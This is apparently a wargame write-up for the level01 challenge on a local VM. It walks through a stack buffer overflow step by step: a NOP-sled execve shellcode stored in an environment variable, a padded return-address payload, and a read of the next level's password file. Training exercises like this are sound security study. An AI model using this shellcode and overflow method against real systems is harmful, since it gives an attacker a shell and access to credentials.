The program asks for username and password. We find username = "dat_wil" and password = "admin" through asm analysis. However, this will not open a shell: we are going to have to overflow.


We will overflow the second fgets which corresponds to the password query. Through gdb, we observe that the offset is 80.


First, let's copy our getenvaddr C program to the vm


	$ scp -P 4242 level01/Ressources/getenvaddr.c level00@192.168.56.105:/tmp


From here, we will be working on the VM


Compile the c program:


	$ gcc -m32 /tmp/getenvaddr.c -o /tmp/getenvaddr


Define an environment variable containing our shellcode, left-padded with no-ops

	$ export SHELLCODE=$(python -c 'print "\x90"*1000')$(echo -ne "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80")

Find its address with getenvaddr, and add the output for the location of the shellcode

	$ /tmp/getenvaddr SHELLCODE
	0xffffd4eb

ffffd4eb + a = ffffd4f5

Our shellcode address is 0xffffd4f5

We can now write our input file, which consists of: USERNAME + NEWLINE + PADDING + SHELLCODE_ADDRESS

	$ python -c 'print "dat_wil"+"\n"+"A"*80+"\xf5\xd4\xff\xff"' > /tmp/exploit

We're all set, let's get in

	$ cat /tmp/exploit - | ./level01

This should open up a shell

	$ cat /home/users/level02/.pass

And voilà!